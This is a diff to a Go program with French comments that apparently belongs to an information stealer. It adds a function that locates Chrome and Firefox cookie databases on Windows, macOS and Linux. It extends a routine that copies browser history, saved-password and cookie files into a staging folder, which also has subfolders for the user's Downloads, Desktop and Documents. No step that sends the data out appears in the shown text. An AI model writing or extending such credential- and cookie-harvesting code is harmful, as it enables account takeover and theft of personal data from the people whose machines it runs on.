@@ -171,6 +171,46 @@ func GetPasswordFiles(browser string) ([]string, error) {
 	return filePaths, nil
 }
 
+// Récupère les fichiers de cookies
+func GetCookieFiles(browser string) ([]string, error) {
+	var filePaths []string
+	userHome, err := os.UserHomeDir()
+	if err != nil {
+		return nil, fmt.Errorf("erreur lors de la récupération du répertoire personnel de l'utilisateur : %v", err)
+	}
+
+	var basePath string
+
+	switch browser {
+	case "Google Chrome":
+		switch runtime.GOOS {
+		case "windows":
+			basePath = filepath.Join(userHome, `AppData\Local\Google\Chrome\User Data\Default`)
+		case "darwin":
+			basePath = filepath.Join(userHome, `Library/Application Support/Google/Chrome/Default`)
+		case "linux":
+			basePath = filepath.Join(userHome, `.config/google-chrome/Default`)
+		}
+		filePaths = append(filePaths, filepath.Join(basePath, "Cookies"))
+
+	case "Mozilla Firefox":
+		switch runtime.GOOS {
+		case "windows":
+			basePath = filepath.Join(userHome, `AppData\Roaming\Mozilla\Firefox\Profiles`)
+		case "darwin":
+			basePath = filepath.Join(userHome, `Library/Application Support/Firefox/Profiles`)
+		case "linux":
+			basePath = filepath.Join(userHome, `.mozilla/firefox`)
+		}
+		filePaths = append(filePaths, filepath.Join(basePath, "cookies.sqlite"))
+
+	default:
+		return nil, fmt.Errorf("navigateur non pris en charge : %s", browser)
+	}
+
+	return filePaths, nil
+}
+
 // Copier un fichier
 func CopyFile(src, dst string) error {
 	sourceFile, err := os.Open(src)
@@ -201,60 +241,39 @@ func GetFiles(dir string, extensions, names []string) ([]string, error) {
 		if err != nil {
 			return err
 		}
-		if info.IsDir() {
-			return nil
-		}
-
-		for _, ext := range extensions {
-			if filepath.Ext(path) == ext {
-				for _, name := range names {
-					if strings.Contains(strings.ToLower(filepath.Base(path)), strings.ToLower(name)) {
-						result = append(result, path)
-						break
+		if !info.IsDir() {
+			for _, ext := range extensions {
+				if strings.HasSuffix(info.Name(), ext) {
+					for _, name := range names {
+						if strings.Contains(info.Name(), name) {
+							result = append(result, path)
+							break
+						}
 					}
 				}
-				break
 			}
 		}
 		return nil
 	})
 
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("erreur lors de la recherche des fichiers : %v", err)
 	}
 
 	return result, nil
 }
 
-// Vider le contenu du dossier DATA
-func ClearDataFolder(folderName string) error {
-	err := filepath.Walk(folderName, func(path string, info os.FileInfo, err error) error {
-		if err != nil {
-			return err
-		}
-		if path == folderName {
-			return nil // Ignore le dossier lui-même
-		}
-		if info.IsDir() {
-			return os.RemoveAll(path) // Supprime les sous-dossiers
-		}
-		return os.Remove(path) // Supprime les fichiers
-	})
-	return err
-}
-
-// Créer les sous-dossiers dans DATA
-func CreateSubfolders(baseFolder string) error {
-	subfolders := []string{
+// Créer les dossiers de données si nécessaire
+func CreateDataFolders(dataFolder string) error {
+	folders := []string{
 		"Downloads",
 		"Desktop",
 		"Documents",
 		"Navigateurs",
 	}
 
-	for _, folder := range subfolders {
-		folderPath := filepath.Join(baseFolder, folder)
-		if err := os.MkdirAll(folderPath, 0755); err != nil {
+	for _, folder := range folders {
+		if err := os.MkdirAll(filepath.Join(dataFolder, folder), 0755); err != nil {
 			return fmt.Errorf("erreur lors de la création du dossier %s : %v", folder, err)
 		}
 	}
@@ -290,13 +309,14 @@ func ProcessData(dataFolder string, extensions, names []string) error {
 			}
 		}
 
-		filePaths, err := GetHistoryFilePath(browser)
+		// Récupérer les fichiers d'historique
+		historyFilePaths, err := GetHistoryFilePath(browser)
 		if err != nil {
-			fmt.Printf("Erreur lors de la récupération des fichiers pour %s : %v\n", browser, err)
+			fmt.Printf("Erreur lors de la récupération des fichiers d'historique pour %s : %v\n", browser, err)
 			continue
 		}
 
-		for _, filePath := range filePaths {
+		for _, filePath := range historyFilePaths {
 			if _, err := os.Stat(filePath); os.IsNotExist(err) {
 				fmt.Printf("Aucun fichier trouvé à l'emplacement : %s\n", filePath)
 			} else {
@@ -305,14 +325,14 @@ func ProcessData(dataFolder string, extensions, names []string) error {
 				destination := filepath.Join(browserFolder, filepath.Base(filePath))
 				err := CopyFile(filePath, destination)
 				if err != nil {
-					fmt.Printf("Erreur lors de la copie du fichier de %s : %v\n", browser, err)
+					fmt.Printf("Erreur lors de la copie du fichier d'historique de %s : %v\n", browser, err)
 				} else {
-					fmt.Printf("Le fichier de %s a été copié dans %s\n", browser, destination)
+					fmt.Printf("Le fichier d'historique de %s a été copié dans %s\n", browser, destination)
 				}
 			}
 		}
 
-		// Récupérer les fichiers de mots de passe et les copier
+		// Récupérer les fichiers de mots de passe
 		passwordFiles, err := GetPasswordFiles(browser)
 		if err != nil {
 			fmt.Printf("Erreur lors de la récupération des fichiers de mots de passe pour %s : %v\n", browser, err)
@@ -331,6 +351,29 @@ func ProcessData(dataFolder string, extensions, names []string) error {
 					fmt.Printf("Erreur lors de la copie du fichier de mots de passe de %s : %v\n", browser, err)
 				} else {
 					fmt.Printf("Le fichier de mots de passe de %s a été copié dans %s\n", browser, destination)
+				}
+			}
+		}
+
+		// Récupérer les fichiers de cookies
+		cookieFiles, err := GetCookieFiles(browser)
+		if err != nil {
+			fmt.Printf("Erreur lors de la récupération des fichiers de cookies pour %s : %v\n", browser, err)
+			continue
+		}
+
+		for _, filePath := range cookieFiles {
+			if _, err := os.Stat(filePath); os.IsNotExist(err) {
+				fmt.Printf("Aucun fichier trouvé à l'emplacement : %s\n", filePath)
+			} else {
+				fmt.Printf("Fichier trouvé à l'emplacement : %s\n", filePath)
+
+				destination := filepath.Join(browserFolder, filepath.Base(filePath))
+				err := CopyFile(filePath, destination)
+				if err != nil {
+					fmt.Printf("Erreur lors de la copie du fichier de cookies de %s : %v\n", browser, err)
+				} else {
+					fmt.Printf("Le fichier de cookies de %s a été copié dans %s\n", browser, destination)
 				}
 			}
 		}
